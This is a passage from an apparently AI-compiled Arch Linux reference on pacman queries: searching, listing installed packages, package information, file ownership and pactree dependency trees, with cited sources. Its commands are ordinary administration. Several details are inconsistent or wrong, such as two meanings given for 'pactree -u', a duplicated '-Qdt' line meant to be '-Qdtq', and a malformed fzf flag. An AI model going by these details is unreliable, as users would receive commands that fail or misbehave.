This is useful for scripting and piping results to other commands.[1]

**Example usage:**
```
pacman -S $(pacman -Ssq package_regex)
```


#### Verbose Output

Some query operations support verbose output for additional details.

### Advanced Search Tools

#### pkgfile Command

The `pkgfile` command provides advanced file searching capabilities beyond pacman's built-in functionality.[3][1]

**Installation:**
```
pacman -S pkgfile
```


**Update database:**
```
pkgfile --update
```


**Search for files:**
```
pkgfile filename
```


**Options:**
- `-l, --list` - List contents of a package
- `-s, --search` - Search for packages containing the target (default)
- `-b, --binaries` - Return only files in bin directories
- `-r, --regex` - Enable regex matching
- `-i, --ignorecase` - Case insensitive matching
- `-R, --repo` - Search a specific repository

**Examples:**
```
pkgfile -b python
pkgfile -l firefox
pkgfile -r 'lib.*\.so'
```


#### pacseek Tool

An interactive TUI (Text User Interface) for searching and managing packages:[2]

**Installation:**
```
pacman -S pacseek
```

**Features:**
- Interactive description searches
- Browse packages visually
- Add/remove packages
- System updates
- User-friendly interface

### AUR Package Search

#### Using AUR Helpers

AUR helpers like `yay` and `paru` extend search functionality to include AUR packages:[2]

```
yay -Ss search_term
paru -Ss search_term
```


These search both official repositories and the AUR simultaneously.[2]

#### Web-Based AUR Search

Browse AUR packages through the official website:[2]

https://aur.archlinux.org/packages

The website provides advanced filtering and sorting options not available through command-line tools.[2]

### Search Best Practices

**Update databases first:**
Ensure search results are current by synchronizing databases:[3]
```
pacman -Sy
pacman -Fy
```

**Use specific terms:**
More specific search terms yield more relevant results.[3]

**Combine with grep:**
Filter search output for precise results:
```
pacman -Ss editor | grep text
pacman -Q | grep python
```

**Check both name and description:**
The default `-Ss` search checks both fields, providing comprehensive results.[2]

**Use regex for precision:**
Regular expressions enable precise pattern matching when simple searches return too many results.

Sources
[1] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[2] Package Search : r/archlinux https://www.reddit.com/r/archlinux/comments/1fmaiik/package_search/
[3] How to search for a package in Arch Linux https://www.cyberciti.biz/faq/howto-searching-for-package-in-arch-linux-using-regex/
[4] How can I find packages using pacman? https://bbs.archlinux.org/viewtopic.php?id=11659
[5] Pacman command in Arch Linux https://www.geeksforgeeks.org/linux-unix/pacman-command-in-arch-linux/
[6] How to find where a package is installed by pacman? https://stackoverflow.com/questions/22681578/how-to-find-where-a-package-is-installed-by-pacman
[7] Basic Pacman Commands for Installing and Searching https://www.youtube.com/watch?v=azFEB7Z8y8k
[8] Arch Linux package manager (pacman) cheatsheet http://ratfactor.com/cards/arch-pacman-cheatsheet

## Listing Installed Packages

### Basic Package Listing

#### List All Installed Packages

To display all packages currently installed on the system, use the `-Q` (query) option:[2][5][9]

```
pacman -Q
```


This shows package names with their versions in two columns:[2]

```
acl 2.3.1-2
bash 5.1.016-1
firefox 120.0-1
gcc 12.2.0-1
```


#### Count Total Installed Packages

To count the total number of installed packages, pipe the output to `wc -l`:[5]

```
pacman -Q | wc -l
```


This returns a single number representing the total count of installed packages.[5]

### Filtering by Install Reason

#### List Explicitly Installed Packages

Display packages that were explicitly installed by the user (not as dependencies) using the `-Qe` flag:[1][3][4][9][2]

```
pacman -Qe
```


This shows only packages you directly installed with `pacman -S`, excluding automatically installed dependencies.[4][5]

**Example output:**
```
acpid 2.0.34-1
autoconf 2.71-1
firefox 120.0-1
linux 6.0.2.arch1-1
```


#### List Explicitly Installed, Not Required as Dependencies

Show explicitly installed packages that are not required by other packages using `-Qet`:[3][9][2]

```
pacman -Qet
```


The `-t` flag restricts output to packages not required as dependencies by other packages. This provides the cleanest list of packages you installed without dependencies needed by other software.[9][2]

#### List Packages Installed as Dependencies

Display packages that were installed automatically as dependencies using the `-Qd` flag:[9][5]

```
pacman -Qd
```


This shows packages installed to satisfy other packages' requirements.[9]

#### List Orphaned Packages

Show packages that were installed as dependencies but are no longer required by any other package using `-Qdt`:[5][9]

```
pacman -Qdt
```


The combination of `-d` (dependencies) and `-t` (not required) identifies orphaned packages that can be safely removed.[9]

### Filtering by Repository Source

#### List Foreign Packages

Display packages not found in configured sync repositories (typically AUR packages or manually installed) using the `-Qm` flag:[8][3][9]

```
pacman -Qm
```


This shows packages that were installed from the AUR, local files, or custom repositories not currently in your repository list.[3]

#### List Native Repository Packages

Show packages found in configured sync databases using the `-Qn` flag:[3][9]

```
pacman -Qn
```


This displays packages from official Arch repositories (core, extra, multilib).[3]

### Group-Based Listing

#### List All Package Groups

Display all package groups with at least one installed member:[10]

```
pacman -Qg
```


#### List Packages in Specific Group

Show installed packages from a specific group:[10][3]

```
pacman -Qg group_name
```


**Example:**
```
pacman -Qg base-devel
pacman -Qg gnome
```

This shows only the installed members of the specified group.[10]

### Output Formatting Options

#### Quiet Mode (Names Only)

Display package names without versions using the `-q` flag:[1][2]

```
pacman -Qq
```


This produces a single column of package names:
```
acl
bash
firefox
gcc
```

**Combine with other flags:**
```
pacman -Qqe    # Explicitly installed packages (names only)
pacman -Qqd    # Dependencies (names only)
pacman -Qqm    # Foreign packages (names only)
pacman -Qqdt   # Orphaned packages (names only)
```


#### Extract Package Names Only

Use `awk` to extract only the first column (package names) from standard output:[2]

```
pacman -Q | awk '{print $1}'
```


This provides an alternative to `-q` flag with more flexibility for scripting.[2]

### Detailed Package Information

#### Display Detailed Information About Installed Package

Get comprehensive information about a specific installed package using `-Qi`:[5][9]

```
pacman -Qi package_name
```


This displays:
- Package name, version, description
- Architecture, URL, licenses
- Groups, provides, depends on
- Optional dependencies
- Required by (reverse dependencies)
- Conflicts with, replaces
- Installation date and reason
- Install script presence
- Package size

**Example:**
```
pacman -Qi firefox
```


#### Extended Package Information

Pass two `-i` flags to also display backup files and their modification states:[9]

```
pacman -Qii package_name
```


This adds information about configuration files and whether they've been modified.[9]

### Exporting Package Lists

#### Save to File

Export the complete package list to a file for backup or documentation:[2]

```
pacman -Q > packages.txt
```


This creates a text file with all installed packages and versions.[2]

#### Save Package Names Only

Export only package names without versions:[2]

```
pacman -Q | awk '{print $1}' > package_list.txt
```


Or using quiet mode:
```
pacman -Qq > package_list.txt
```

#### Save Explicitly Installed Packages

Create a list of explicitly installed packages for system replication:[3]

```
pacman -Qqe > pkglist.txt
```


This file can be used to restore the same packages on a new system:
```
pacman -S --needed - < pkglist.txt
```


### Search Installed Packages

#### Search by Name or Description

Search for specific packages in the installed package database using `-Qs`:[9]

```
pacman -Qs search_term
```


This searches both package names and descriptions in installed packages.[9]

**Examples:**
```
pacman -Qs firefox
pacman -Qs python
pacman -Qs text editor
```

### Listing Package Files

#### List Files Installed by Package

Display all files installed by a specific package using `-Ql`:[9]

```
pacman -Ql package_name
```


This shows the complete list of files, directories, and symlinks the package owns.[9]

**Example:**
```
pacman -Ql firefox
```

### Reverse Dependency Checking

#### Check What Requires a Package

Identify which packages depend on a specific package using `-Qi` and examining the "Required By" field:[9]

```
pacman -Qi package_name | grep "Required By"
```

Alternatively, use `pactree` from the `pacman-contrib` package:

```
pactree -r package_name
```

This shows a tree of packages that require the specified package.

### Advanced Filtering

#### Combine Multiple Filters

Multiple query flags can be combined for precise filtering:[3]

```
pacman -Qeq    # Explicitly installed (names only)
pacman -Qmq    # Foreign packages (names only)
pacman -Qdtq   # Orphaned packages (names only)
pacman -Qnq    # Native repository packages (names only)
```


### Date-Based Listing

#### List Recently Installed Packages

Query `/var/log/pacman.log` for recent installations:

```
grep "installed" /var/log/pacman.log | tail -20
```

This shows the last 20 package installations with timestamps.

#### List Packages by Installation Date

Use `expac` (from `pacman-contrib`) to sort packages by installation date:

```
expac --timefmt='%Y-%m-%d %T' '%l\t%n' | sort
```

This displays packages with their installation timestamps sorted chronologically.

### Interactive Package Browsing

#### Using pacseek

The `pacseek` tool provides an interactive TUI for browsing installed packages:[11][8]

```
pacman -S pacseek
pacseek
```


This offers a visual interface for exploring installed and available packages.[11]

### Package Tracking and Management

#### Change Package Install Reason

Convert explicitly installed packages to dependencies or vice versa using `-D`:[8][9]

```
pacman -D --asdeps package_name     # Mark as dependency
pacman -D --asexplicit package_name # Mark as explicit
```


This affects how packages appear in queries and whether they're considered orphans.[8]

### Viewing Package History

#### Using pacman log viewers

Tools like `pahis` or `pacmanlogviewer` provide graphical views of package history:[8]

```
pacman -S pahis
pahis
```


These tools parse `/var/log/pacman.log` and present installation history in a user-friendly format.[8]

### Common Listing Workflows

**System audit:**
```
pacman -Q | wc -l          # Total packages
pacman -Qe | wc -l         # Explicitly installed
pacman -Qd | wc -l         # Dependencies
pacman -Qdt | wc -l        # Orphans
```

**Package cleanup preparation:**
```
pacman -Qdtq               # List orphans for removal
pacman -Qmq                # List foreign packages
```

**System backup:**
```
pacman -Qqe > pkglist.txt       # Explicit packages
pacman -Qqm > pkglist_aur.txt   # AUR packages
```

**Package verification:**
```
pacman -Qk                 # Check all packages
pacman -Qkk package_name   # Thorough check of specific package
```

Sources
[1] Generating a List of Installed Packages / Newbie Corner ... https://bbs.archlinux.org/viewtopic.php?id=56601
[2] List Installed Packages with Pacman on Arch Linux https://www.atlantic.net/dedicated-server-hosting/list-installed-packages-with-pacman-on-arch-linux/
[3] pacman/Tips and tricks - ArchWiki https://wiki.archlinux.org/title/Pacman/Tips_and_tricks
[4] viewing Pacman installed packages : r/linuxquestions https://www.reddit.com/r/linuxquestions/comments/p9c7ee/viewing_pacman_installed_packages/
[5] How to List Installed Packages With Pacman - Blog https://kbmisc.com/blog/list-installed-packages-pacman
[6] How to List Installed Packages in Linux https://xtom.com/blog/how-to-list-installed-packages-linux/
[7] Pacman - how to query (installed or uninstalled) packages? https://forum.manjaro.org/t/pacman-how-to-query-installed-or-uninstalled-packages/28250
[8] How do you manage/track installed packages? https://forum.endeavouros.com/t/how-do-you-manage-track-installed-packages/43775
[9] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[10] How can I get a list of installed package groups? - Arch Linux Forums https://bbs.archlinux.org/viewtopic.php?id=251788
[11] Package Search : r/archlinux https://www.reddit.com/r/archlinux/comments/1fmaiik/package_search/

## Package Information Retrieval

### Repository Package Information

#### Display Package Information

To display extensive information about a package in the sync repositories, use the `-Si` flag:[1][2][3]

```
pacman -Si package_name
```


This shows comprehensive details including:[7]

- **Repository:** Which repository contains the package (core, extra, multilib)
- **Name:** Package name
- **Version:** Current version number
- **Description:** Brief description of the package
- **Architecture:** Supported architectures (x86_64, any)
- **URL:** Upstream project website
- **Licenses:** Software licenses
- **Groups:** Package groups this belongs to
- **Provides:** Virtual packages provided
- **Depends On:** Required dependencies
- **Optional Deps:** Optional dependencies with descriptions
- **Conflicts With:** Packages that conflict with this one
- **Replaces:** Packages this one replaces
- **Download Size:** Size of the package download
- **Installed Size:** Disk space required after installation
- **Packager:** Person who packaged it
- **Build Date:** When the package was built
- **Validated By:** Signature validation method

**Example:**
```
pacman -Si firefox
```


#### Multiple Package Information

Query information for multiple packages simultaneously:[1]

```
pacman -Si package1 package2 package3
```


This displays information for each specified package sequentially.[1]

#### Extended Repository Information

Pass two `-i` flags to also display packages that depend on this package:[6]

```
pacman -Sii package_name
```


This adds reverse dependency information showing which packages require this package.[6]

### Installed Package Information

#### Display Installed Package Information

To display detailed information about an installed package, use the `-Qi` flag:[3][7][1]

```
pacman -Qi package_name
```


This shows similar information to `-Si` but with installation-specific details:[7]

- **Install Date:** When the package was installed
- **Install Reason:** Explicitly installed or installed as dependency
- **Install Script:** Whether the package has installation scripts
- **Validated By:** How the package was validated (signature, checksum)
- **Required By:** Packages that depend on this one (reverse dependencies)

**Example:**
```
pacman -Qi firefox
```


#### Extended Installed Package Information

Pass two `-i` flags to also display backup files and their modification states:[1]

```
pacman -Qii package_name
```


This adds a list of configuration files managed by the package and indicates whether they've been modified:[1]

```
MODIFIED    /etc/pacman.conf
NOT MODIFIED    /etc/pacman.d/mirrorlist
```


### Dependency Information

#### List Package Dependencies

View dependencies required by a package using `-Qi` and examining the "Depends On" field:[8][3]

```
pacman -Qi package_name | grep "Depends On"
```


For automation and cleaner parsing, use `expac` from `pacman-contrib`:[8]

```
expac -S '%D' package_name
```


This outputs only the dependency list without additional formatting.[8]

#### List Optional Dependencies

View optional dependencies with descriptions:[8]

```
pacman -Qi package_name | grep "Optional Deps"
```

Or for explicitly installed packages with their optional dependencies:[8]

```
expac -d '\n\n' -l '\n\t' -Q '%n\n\t%O' $(pacman -Qeq)
```


#### List Reverse Dependencies

Identify which packages require a specific package using the "Required By" field:[3]

```
pacman -Qi package_name | grep "Required By"
```


Alternatively, use `pactree` from `pacman-contrib`:

```
pactree -r package_name
```

This displays a tree showing all packages that depend on the specified package.

### File Information

#### List Files Owned by Package

Display all files installed by a locally installed package using `-Ql`:[5][6][1]

```
pacman -Ql package_name
```


This shows the complete list of files, directories, and symlinks owned by the package:[1]

```
firefox /usr/
firefox /usr/bin/
firefox /usr/bin/firefox
firefox /usr/lib/
firefox /usr/lib/firefox/
```


**Quiet mode (paths only):**
```
pacman -Qlq package_name
```


This omits package names and displays only file paths.[6]

#### List Files from Remote Package

Display files that would be installed by a remote package using `-Fl`:[5][1]

```
pacman -Fl package_name
```


This requires an up-to-date files database. Update it first with:[5][1]

```
pacman -Fy
```


#### Find Package Owning a File

Determine which package owns a specific file on the system using `-Qo`:[3][5][1]

```
pacman -Qo /path/to/file
```


**Examples:**
```
pacman -Qo /usr/bin/firefox
pacman -Qo /etc/pacman.conf
pacman -Qo $(which vim)
```


**Output format:**
```
/usr/bin/firefox is owned by firefox 120.0-1
```


#### Find Remote Package Containing File

Query which remote package contains a specific file using `-F`:[1]

```
pacman -F /path/to/file
```


This searches the files database for packages containing the specified path.[1]

### Package Verification

#### Verify Package Files

Verify the presence of files installed by a package using `-Qk`:[1]

```
pacman -Qk package_name
```


This checks if all files from the package still exist on the system.[1]

#### Thorough Package Verification

Pass the `-k` flag twice for a more thorough check:[1]

```
pacman -Qkk package_name
```


This performs an extensive verification including file permissions, sizes, and modification times.[1]

**Output interpretation:**
- **No output:** All files present and valid
- **warning:** Files missing or modified
- **errors:** Significant problems detected

#### Verify All Packages

Check all installed packages for file integrity:[1]

```
pacman -Qk
pacman -Qkk  # Thorough check
```


### Query Package File Archives

#### Query Package File Information

Display information from a package file (`.pkg.tar.zst`) without installing it using `-Qp`:[6]

```
pacman -Qp /path/to/package.pkg.tar.zst
```


The `-p` flag signifies that the package supplied is a file, not a database entry.[6]

#### Query Package File Contents

List files that would be installed from a package file:[6]

```
pacman -Qlp /path/to/package.pkg.tar.zst
```


#### Extended Package File Information

Get detailed information from package files:[6]

```
pacman -Qip /path/to/package.pkg.tar.zst
```


This combines `-Qi` (information) with `-p` (file query).[6]

### Advanced Information Tools

#### Using expac

The `expac` tool (from `pacman-contrib`) provides powerful custom formatting for package information queries:[8]

**Basic syntax:**
```
expac [options] format [package]
```

**Common format specifiers:**
- `%n` - Package name
- `%v` - Package version
- `%r` - Repository
- `%d` - Package description
- `%D` - Dependencies
- `%O` - Optional dependencies
- `%l` - Install date
- `%w` - Install reason
- `%m` - Download size
- `%k` - Installed size

**Examples:**
```
expac '%n %v' firefox                    # Name and version
expac -S '%n: %d' firefox                # Sync package with description
expac -Q '%n %l' firefox                 # Install date
expac -S '%n %m' | sort -k2 -n -r        # Packages by download size
```


#### Interactive Package Information

Use `fzf` for interactive package browsing with information display:[2]

```
pacman -Qq | fzf --preview 'pacman -Qil {}' --layout-reverse --bind 'enter:execute(pacman -Qil {} | less)'
```


This creates a searchable list with live preview of package information and file lists.[2]

### Comparing Package Information

#### Repository vs Installed Comparison

Compare repository version with installed version:

```
pacman -Si package_name  # Repository info
pacman -Qi package_name  # Installed info
```

Key differences:
- Repository shows latest available version
- Installed shows current installed version and install metadata

#### Check for Updates

List packages with available updates using `-Qu`:[7][3]

```
pacman -Qu
```


This shows packages where the repository version is newer than the installed version.[7]

**Pipe to less for long lists:**
```
pacman -Qu | less
```


### Package Size Information

#### View Package Sizes

Query installed package sizes using `expac`:[8]

```
expac -H M '%m\t%n' | sort -h
```

This lists packages sorted by installed size in human-readable format.

#### Download Size Comparison

Compare download size vs installed size:

```
expac -S '%n: download=%m installed=%k'
```

### Scripting Package Information

#### Extract Specific Fields

Use `grep`, `awk`, or `sed` to extract specific information fields:

```
pacman -Qi firefox | grep "Depends On"
pacman -Qi firefox | awk '/^Version/ {print $3}'
```

For more reliable scripting, use `expac` instead of parsing pacman output.[8]

### Common Information Queries

**Check if package is installed:**
```
pacman -Q package_name
```

**Get package version:**
```
pacman -Q package_name | awk '{print $2}'
```

**List all dependencies:**
```
pacman -Qi package_name | grep -A 10 "Depends On"
```

**Find package repository:**
```
pacman -Si package_name | grep Repository
```

**Check installation date:**
```
pacman -Qi package_name | grep "Install Date"
```

**Verify install reason:**
```
pacman -Qi package_name | grep "Install Reason"
```

Sources
[1] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[2] Is there any way to print info about package in pacman/apt( ... https://www.reddit.com/r/linuxmasterrace/comments/rl6nlq/is_there_any_way_to_print_info_about_package_in/
[3] How to Manage Packages in Arch Using Pacman | Linode Docs https://www.linode.com/docs/guides/pacman-package-manager/
[4] Pacman cheatsheet https://devhints.io/pacman
[5] How to find where a package is installed by pacman? https://stackoverflow.com/questions/22681578/how-to-find-where-a-package-is-installed-by-pacman
[6] pacman(8) https://pacman.archlinux.page/pacman.8.html
[7] Arch Linux pacman – Just the Most Useful Commands https://psychocod3r.wordpress.com/2021/07/11/arch-linux-pacman-just-the-most-useful-commands/
[8] pacman/Tips and tricks - ArchWiki https://wiki.archlinux.org/title/Pacman/Tips_and_tricks
[9] Linux pacman Command with Practical Examples https://labex.io/tutorials/linux-linux-pacman-command-with-practical-examples-422849

## File Ownership Queries

### Query Local Installed Files

#### Basic File Ownership Query

To determine which package owns a specific file on your system, use the `-Qo` flag:[1][2][3][4][5]

```
pacman -Qo /path/to/file
```


This searches the local package database to identify the package that owns the specified file.[5][6]

**Examples:**
```
pacman -Qo /usr/bin/firefox
pacman -Qo /etc/pacman.conf
pacman -Qo /usr/lib/libc.so.6
```


**Output format:**
```
/usr/bin/firefox is owned by firefox 120.0-1
/etc/pacman.conf is owned by pacman 6.0.2-1
```


#### Multiple File Queries

Query ownership of multiple files simultaneously:[4]

```
pacman -Qo /path/to/file1 /path/to/file2 /path/to/file3
```


This displays the owning package for each specified file.[4]

#### Relative vs Absolute Paths

The `-Qo` flag accepts both relative and absolute paths:[3][4]

**Absolute path:**
```
pacman -Qo /usr/bin/vim
```

**Relative path:**
```
pacman -Qo usr/bin/vim
```

Both forms work, though absolute paths are more explicit and recommended.[3]

#### Using Command Substitution

Find which package owns a command in your PATH using command substitution:[2][1]

```
pacman -Qo $(which command_name)
```


**Examples:**
```
pacman -Qo $(which vim)
pacman -Qo $(which gcc)
pacman -Qo $(which pacman)
```


This combination finds the full path of the command and then queries its ownership.[1]

#### Files in $PATH

For executable files in your `$PATH`, you can sometimes specify just the command name without the full path:[3]

```
pacman -Qo which
```

**Output:**
```
/usr/bin/which is owned by which 2.20-7
```


However, this only works for files in `$PATH`. For any other files, you must specify the full path.[3]

### Query Remote Repository Files

#### Search Files in Repository Packages

To find which package in the repositories contains a specific file (even if not installed), use the `-F` flag:[2][1]

```
pacman -F filename
```


This searches the files database across all configured repositories.[2][1]

**Examples:**
```
pacman -F vim
pacman -F /usr/bin/gcc
pacman -F libcrypto.so
```


The `-F` flag lists files in packages that aren't installed as well as those that are.[1]

#### Update Files Database

Before searching for files in repositories, synchronize the files database to ensure up-to-date results:[2]

```
pacman -Fy
```


This downloads the latest files database from configured repositories. Without an updated files database, `-F` searches may return outdated or incomplete results.[2]

**Automated updates:**
Enable automatic weekly updates of the files database:[2]

```
systemctl enable --now pacman-filesdb-refresh.timer
```


#### Pattern Matching with -F

The `-F` flag supports pattern matching to find files matching specific criteria:[2]

```
pacman -F "*.so"
pacman -F "/usr/bin/*python*"
```

### Quiet Mode for Scripting

#### Suppress Verbose Output

Use the `-q` flag for quieter output suitable for scripting:[6][4]

```
pacman -Qoq /path/to/file
```


**Standard output:**
```
/usr/bin/vim is owned by vim 9.0.1-1
```

**Quiet output:**
```
vim
```


The quiet mode shows only package names instead of the full "file is owned by pkg" message.[6][4]

### List Files Owned by Package

#### Display All Files from Installed Package

To list all files owned by a locally installed package, use the `-Ql` flag:[7][6][4][2]

```
pacman -Ql package_name
```


This shows the complete list of files, directories, and symlinks owned by the package:[7][2]

```
firefox /usr/
firefox /usr/bin/
firefox /usr/bin/firefox
firefox /usr/lib/
firefox /usr/lib/firefox/
firefox /usr/lib/firefox/application.ini
firefox /usr/lib/firefox/browser/
```


#### List Files in Quiet Mode

Display only file paths without package names:[4]

```
pacman -Qlq package_name
```


**Output:**
```
/usr/
/usr/bin/
/usr/bin/firefox
/usr/lib/
/usr/lib/firefox/
```

This format is cleaner for scripting and piping to other commands.[4]

#### List Files from Multiple Packages

Query file lists for multiple packages simultaneously:[7][4]

```
pacman -Ql package1 package2 package3
```


This displays files owned by each specified package.[4]

### List Files from Repository Packages

#### Display Files from Remote Package

Show files that would be installed by a remote package using `-Fl`:[3][2]

```
pacman -Fl package_name
```


This queries the files database rather than the local system. An up-to-date files database is required (`pacman -Fy`).[2]

**Example:**
```
pacman -Fl vim
```

This shows all files contained in the vim package, whether or not vim is currently installed.[7]

### Using pkgfile Tool

#### Enhanced File Search

The `pkgfile` utility provides advanced file searching capabilities beyond pacman's built-in functionality:[5]

**Installation:**
```
pacman -S pkgfile
```


**Update database:**
```
pkgfile --update
```


**Search for files:**
```
pkgfile filename
```


**List package contents:**
```
pkgfile -l package_name
```


**Key advantages of pkgfile:**
- Searches official repositories to find which package contains a file, even if not installed on your system[5]
- Provides more flexible search options than pacman
- Can search for binaries specifically with `-b` flag
- Supports regex patterns with `-r` flag
- Case-insensitive searches with `-i` flag

**Examples:**
```
pkgfile -b python           # Find binaries named python
pkgfile -l firefox          # List all files in firefox package
pkgfile -r 'lib.*\.so'      # Find libraries matching pattern
```

### Practical Workflows

#### Finding Package for Unknown File

When you encounter a file and want to know which package installed it:[1][5][2]

```
pacman -Qo /path/to/file
```


If the file is not owned by any package, you'll see:
```
error: No package owns /path/to/file
```

This indicates the file was created manually or by a non-pacman process.[2]

#### Verifying File Ownership Before Deletion

Before manually deleting a file, check if it belongs to a package:[2]

```
pacman -Qo /path/to/file
```


If the file is owned by a package, it should be removed through package management rather than manual deletion. If not owned by any package, it's safe to delete manually.[8]

#### Finding Package to Install for Missing Command

When a command is not found, search repositories for the package containing it:[5][1]

```
pacman -F command_name
```


Or using pkgfile:
```
pkgfile command_name
```


This identifies which package you need to install to get the desired command.[1][5]

#### Verifying Package Installation

Check if all files from a package are present:[6]

```
pacman -Qk package_name
```


For thorough verification including permissions and sizes:
```
pacman -Qkk package_name
```


### Integration with Other Queries

#### Combining with Package Information

Get ownership information and then detailed package details:

```
PACKAGE=$(pacman -Qoq /usr/bin/vim)
pacman -Qi $PACKAGE
```

This identifies the owning package and displays its comprehensive information.

#### Finding All Files Modified by User

Compare installed files with actual filesystem to find modifications:

```
pacman -Qii package_name
```

This shows backup files and their modification states, helping identify user-modified configuration files.

### Common Use Cases

**Troubleshooting file conflicts:**
```
pacman -Qo /conflicting/file
```

**Identifying binary providers:**
```
pacman -Qo $(which command)
```

**Auditing system files:**
```
pacman -Ql package_name | grep /etc/
```

**Finding library dependencies:**
```
pacman -F libname.so
```

**Verifying command availability:**
```
pacman -Qo /usr/bin/program || echo "Not installed"
```

Sources
[1] How Do I Find What Package a Program Belongs To? https://www.reddit.com/r/archlinux/comments/4nj101/how_do_i_find_what_package_a_program_belongs_to/
[2] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[3] [SOLVED] How to find which package holds a file? https://bbs.archlinux.org/viewtopic.php?id=90635
[4] pacman(8) https://pacman.archlinux.page/pacman.8.html
[5] How to Find Out Which Installed Package Owns a File in ... https://www.baeldung.com/linux/installed-package-file-ownership
[6] pacman-query man https://linuxcommandlibrary.com/man/pacman-query
[7] pacman `info` (Provide) `owns` & `list` executable files/ ... https://github.com/msys2/MSYS2-packages/discussions/3593
[8] Asking for a Safe pacman command list and good practices ... https://www.reddit.com/r/archlinux/comments/1g6ydx8/asking_for_a_safe_pacman_command_list_and_good/

## Dependency Trees

### pactree Utility

The `pactree` command is the primary tool for visualizing package dependency relationships in Arch Linux. It provides a tree-like representation of how packages depend on each other.[3][4][5]

#### Installation

`pactree` is included in the `pacman-contrib` package:[4][3]

```
sudo pacman -S pacman-contrib
```


### Forward Dependency Trees

#### Basic Dependency Tree

To view the dependency tree of a package (what the package depends on), use:[5][3][4]

```
pactree package_name
```


This displays a hierarchical tree showing all dependencies recursively.[5]

**Example:**
```
pactree firefox
```


**Output format:**
```
firefox
├─alsa-lib
│ └─glibc
│   ├─linux-api-headers
│   ├─tzdata
│   └─filesystem
├─dbus-glib
│ ├─dbus
│ │ └─...
│ └─glib2
│   └─...
└─gtk3
  └─...
```


This shows how `firefox` depends on various libraries, which in turn depend on other packages.[6]

#### Limiting Tree Depth

To control how deep the dependency tree is displayed, use the `-d` or `--depth` option:[4][5]

```
pactree -d depth_number package_name
```


**Examples:**
```
pactree -d 1 firefox     # Direct dependencies only
pactree -d 2 firefox     # Two levels deep
pactree -d 3 coreutils   # Three levels deep
```


**Direct dependencies only (depth=1):**
```
pactree -d 1 filezilla
```


This shows only the immediate dependencies without their sub-dependencies.[6]

### Reverse Dependency Trees

#### Basic Reverse Dependencies

To view reverse dependencies (what depends on this package), use the `-r` or `--reverse` flag:[1][3][4][5]

```
pactree -r package_name
```


This shows which packages require the specified package.[4][5]

**Example:**
```
pactree -r pacman
pactree -r libxkbcommon
```


**Use case:**
When you want to know why a package is installed or what would break if you removed it. This is particularly useful for investigating unknown dependencies taking up space.[1][4]

#### Finding Explicitly Installed Package

To trace a dependency back to the explicitly installed package that requires it:[1]

```
pactree -r package_name
```


This walks up the dependency chain, showing the path from the dependency to the top-level explicitly installed packages.[1]

**Example scenario:**
If package A is installed as a dependency, `pactree -r A` reveals the chain: A ← B ← C ← X, where X is the explicitly installed package that ultimately requires A.[1]

### Output Formatting Options

#### Colorized Output

Enable colorized output for better readability using the `-c` or `--color` flag:[5]

```
pactree -c package_name
```


This makes the tree structure easier to follow visually.[5]

#### Linear List Format

Output dependencies in a linear list (one per line) instead of tree format:[6][5]

```
pactree --linear package_name
```


**Alternative using Unix tools:**
```
pactree package_name | grep -v "│\|├\|└\|─"
```


This produces a plain list suitable for scripting.[6]

#### Unique Dependencies Only

Dump dependencies one per line, skipping duplicates:[5]

```
pactree -u package_name
```


This removes duplicate entries that appear multiple times in the tree.[5]

### Database Selection Options

#### Query Installed Packages Only

Restrict the tree to only installed packages using `-i` or `--installed`:[5]

```
pactree -i package_name
```


This option implies `--local`, querying only the local package database.[5]

#### Query Local Database

Use the local package database (installed packages) with `-l` or `--local`:[5]

```
pactree -l package_name
```


This is the default behavior if no database selection option is given.[5]

#### Query Sync Database

Query the remote sync database instead of local with `-s` or `--sync`:[5]

```
pactree -s package_name
```


This shows dependencies for packages not yet installed.[5]

### Additional Display Options

#### Include Optional Dependencies

Display optional dependencies along with required ones using `-o` or `--optional`:[5]

```
pactree -o package_name
```

**With color for enhanced visibility:**
```
pactree -o -c package_name
```


#### Show Package Groups

Display which groups packages belong to using `-g` or `--groups`:[5]

```
pactree -g package_name
```


#### Verbose Output

Increase verbosity of the output using `-v` or `--verbose`:[5]

```
pactree -v package_name
```


This provides additional information about dependencies.[5]

#### Quiet Mode

Suppress warnings and errors during execution using `-q` or `--quiet`:[5]

```
pactree -q package_name
```


### Finding Orphaned Packages

#### List Unrequired Packages

Show packages not explicitly required by any other installed package using `-u` or `--unrequired`:[5]

```
pactree -u
```


This identifies orphaned packages that can potentially be removed.[5]

**Alternative using pacman:**
```
pacman -Qdt
```

This lists packages installed as dependencies but no longer required by any other package.[4][6]

### Exporting Dependency Information

#### Save to File

Export dependency trees to a file for documentation or analysis:[6]

```
pactree package_name > dependencies.txt
```


**Linear format for scripting:**
```
pactree -d 1 --linear package_name > deps_list.txt
```


### Practical Use Cases

#### Investigating Disk Space Usage

When a package takes significant space, trace why it's installed:[1]

```
pactree -r large_package
```


This reveals the dependency chain leading to its installation.[1]

#### Pre-Removal Analysis

Before removing a package, check what depends on it:[4]

```
pactree -r package_name
```


This prevents accidentally breaking dependent packages.[4]

#### Understanding Optional Features

Check optional dependencies to enhance package functionality:[4]

```
pacman -Qi mpv
```


Look under "Optional Deps" to see what can be installed for additional features:[4]

```
Optional Deps : youtube-dl: for playing YouTube videos
                smbclient: for Samba support
```


#### Cleaning Up Dependencies

Identify and remove orphaned packages no longer needed:[6][4]

```
pacman -Qdt   # List orphans
pacman -Qdt   # List names only
sudo pacman -Rns $(pacman -Qdtq)  # Remove all orphans
```


### Alternative Dependency Queries

#### Using pacman -Qi

View dependencies directly from package information:[2][4]

```
pacman -Qi package_name | grep "Depends On"
```


**For remote packages:**
```
pacman -Si package_name | grep "Depends On"
```


#### Using pacman -Qi for Reverse Dependencies

Check what requires a package:[4]

```
pacman -Qi package_name | grep "Required By"
```


This shows packages that depend on the specified package.[4]

### Common Command Combinations

**Complete dependency analysis:**
```
pactree -c firefox                # Forward dependencies (colored)
pactree -r -c firefox            # Reverse dependencies (colored)
pactree -d 2 firefox             # Limited depth
pactree -r -d 1 libxkbcommon     # Direct reverse dependencies
```

**System maintenance:**
```
pactree -u                       # List unrequired packages
pacman -Qdt                      # List orphaned dependencies
pactree -r -d 1 package_name     # Check immediate dependents
```

**Package investigation:**
```
pactree package_name > tree.txt  # Export dependency tree
pactree -r package_name          # Find why package is installed
pactree -o -c package_name       # Include optional dependencies
```

### Best Practices

**Never force remove dependencies:** Using `pactree -r` before removal helps understand the impact. Forcing dependency removal (`pacman -Rdd`) breaks dependent packages.[4]

